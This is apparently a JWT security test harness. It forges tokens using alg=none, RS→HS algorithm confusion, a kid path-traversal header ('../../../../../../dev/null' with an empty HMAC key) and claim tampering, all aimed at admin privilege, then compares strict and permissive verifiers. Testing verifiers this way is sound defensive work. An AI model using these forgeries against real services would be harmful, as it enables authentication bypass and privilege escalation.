import { readFileSync } from "node:fs";
import { createHmac } from "node:crypto";
import { dirname, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import ts from "typescript";

const here = dirname(fileURLToPath(import.meta.url));
const jwtForgeTsPath = resolve(here, "../lib/jwt-forge.ts");
const src = readFileSync(jwtForgeTsPath, "utf-8");
const js = ts.transpileModule(src, {
  compilerOptions: {
    module: ts.ModuleKind.ESNext,
    target: ts.ScriptTarget.ES2022,
  },
}).outputText;
const mod = await import(
  "data:text/javascript;base64," + Buffer.from(js).toString("base64"),
);

const { getDemoKeys, mintLegitimate, forge, verifyToken, ATTACKS, b64urlEncode } = mod;

const DEFAULT_PAYLOAD = {
  sub: "alice@example.com",
  iss: "https://idp.example/",
  aud: "https://api.example/",
  role: "user",
  exp: Math.floor(Date.now() / 1000) + 3600,
};

const OVERRIDES = {
  "alg-none": { role: "admin" },
  "alg-confusion": { role: "admin" },
  "kid-injection": { role: "admin" },
  "claim-tamper-no-resign": { role: "admin" },
};

const strictVerifier = (publicPem) => ({
  publicPem,
  expectedIssuer: "https://idp.example/",
  expectedAudience: "https://api.example/",
  allowedAlgorithms: ["RS256"],
  trustHeaderAlg: false,
  acceptAlgNone: false,
});

const permissiveVerifier = (publicPem) => ({
  publicPem,
  expectedIssuer: "https://idp.example/",
  expectedAudience: "https://api.example/",
  allowedAlgorithms: ["RS256", "HS256", "none"],
  trustHeaderAlg: true,
  acceptAlgNone: true,
});

const expected = {
  "alg-none": {
    strict: "reject",
    permissive: "accept",
    note: "Matches CVE-2015-9235 class behaviour when alg=none is accepted.",
  },
  "alg-confusion": {
    strict: "reject",
    permissive: "accept",
    note: "Matches CVE-2016-10555 class RS→HS confusion when the verifier trusts header.alg.",
  },
  "kid-injection": {
    strict: "reject",
    permissive: "reject",
    note: "This repo's verifier does not implement a vulnerable kid file-loader. Use this vector to cross-check third-party libraries that resolve kid unsafely.",
  },
  "claim-tamper-no-resign": {
    strict: "reject",
    permissive: "reject",
    note: "Any verifier that still performs signature verification should reject; acceptance implies a decode-then-trust bug outside this verifier implementation.",
  },
};

const { publicPem, privatePem } = await getDemoKeys();
const legitimate = await mintLegitimate(privatePem, DEFAULT_PAYLOAD);

console.log("JWT vector verification");
console.log("=");
console.log(`legitimate token: ${legitimate}`);
console.log("");

for (const attack of ATTACKS) {
  const overrides = OVERRIDES[attack.id] ?? {};
  let forged;
  if (attack.id === "kid-injection") {
    const header = {
      alg: "HS256",
      kid: "../../../../../../dev/null",
      typ: "JWT",
    };
    const payload = { ...DEFAULT_PAYLOAD, ...overrides };
    const encodedHeader = b64urlEncode(JSON.stringify(header));
    const encodedPayload = b64urlEncode(JSON.stringify(payload));
    const signingInput = `${encodedHeader}.${encodedPayload}`;
    const sig = createHmac("sha256", Buffer.alloc(0)).update(signingInput).digest();
    forged = {
      token: `${encodedHeader}.${encodedPayload}.${b64urlEncode(sig)}`,
      steps: [
        "set header.kid to ../../../../../../dev/null",
        "modeled vulnerable kid file-loader with node:crypto because Node WebCrypto rejects zero-length HMAC keys",
      ],
      technique:
        "kid path traversal — modeled as a verifier loading attacker-known bytes from a file path into an HS256 key.",
      reference: attack.reference,
    };
  } else {
    forged = await forge(attack.id, legitimate, publicPem, overrides);
  }
  const strictResult = await verifyToken(forged.token, strictVerifier(publicPem));
  const permissiveResult = await verifyToken(
    forged.token,
    permissiveVerifier(publicPem),
  );
  const exp = expected[attack.id];

  console.log(`attack: ${attack.id}`);
  console.log(`title: ${attack.title}`);
  console.log(`reference: ${attack.reference}`);
  console.log(`token: ${forged.token}`);
  console.log(`strict verifier expected: ${exp.strict} | actual: ${strictResult.valid ? "accept" : "reject"}`);
  console.log(`permissive verifier expected: ${exp.permissive} | actual: ${permissiveResult.valid ? "accept" : "reject"}`);
  console.log(`note: ${exp.note}`);
  console.log("");
}